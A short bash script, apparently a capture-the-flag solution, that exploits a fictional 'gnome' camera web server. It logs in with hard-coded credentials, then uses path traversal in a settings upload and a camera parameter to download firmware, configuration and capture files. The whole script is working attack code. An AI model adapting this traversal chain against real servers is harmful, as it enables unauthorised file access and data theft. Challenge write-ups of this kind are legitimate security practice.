#!/bin/bash

USERNAME="admin"
PASSWORD="SittingOnAShelf"
IP="127.0.0.1"

#Authentication
curl -v -c data http://${IP}/
curl -v -b data -c data -d "username=${USERNAME}" -d "password=${PASSWORD}" http://${IP}/
#Upload setting file with custom values
curl -v -b data  -d "filen=..%2Fdir.png%2Fdata" -d "file=gnome.conf"  http://${IP}/settings
#Take all
for I in 20150225093040.zip factory_cam_2.zip gnome.conf gnome_firmware_rel_notes.txt sgnet.zip sniffer_hit_list.txt
do
curl -b data http://${IP}/cam?camera=../upload/dir.png/../../../files/${I} -o ${I}
done
